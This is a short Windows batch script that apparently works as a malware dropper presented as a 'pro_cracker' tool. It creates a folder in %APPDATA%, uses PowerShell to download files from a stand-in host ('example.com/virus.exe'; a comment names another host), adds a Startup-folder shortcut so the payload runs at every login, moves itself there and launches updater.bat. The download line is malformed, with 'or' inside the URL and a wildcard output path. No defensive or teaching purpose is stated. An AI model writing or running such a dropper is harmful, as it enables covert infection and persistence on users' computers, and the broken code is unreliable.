@echo off

:: Create pro_cracker folder in %APPDATA%
md "%APPDATA%\pro_cracker"

:: Download all files from thk34-vps.ovh/xv/ to %APPDATA%\pro_cracker
powershell -command "Invoke-WebRequest -Uri 'http://example.com/virus_folders/* or http://example.com/virus.exe' -OutFile '%APPDATA%\pro_cracker\*'"
    
:: Create shortcut to updater.bat in shell:startup
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk');$s.TargetPath='%APPDATA%\pro_cracker\updater.bat';$s.Save()"

:: Move script to %APPDATA%\pro_cracker
move "%~f0" "%APPDATA%\pro_cracker"

:: Launch updater.bat
call "%APPDATA%\pro_cracker\updater.bat"
